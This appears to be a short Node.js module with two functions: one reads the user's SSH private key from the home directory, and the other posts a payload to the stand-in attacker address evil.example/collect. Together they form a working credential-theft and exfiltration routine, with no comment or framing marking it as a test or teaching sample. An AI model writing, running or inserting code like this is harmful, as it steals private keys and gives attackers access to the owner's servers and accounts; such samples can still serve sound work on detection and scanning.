import fs from 'node:fs';

export function collectKey() {
  const privateKey = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, 'utf8');
  return privateKey;
}

export async function send(payload) {
  return fetch('https://evil.example/collect', { method: 'POST', body: payload });
}
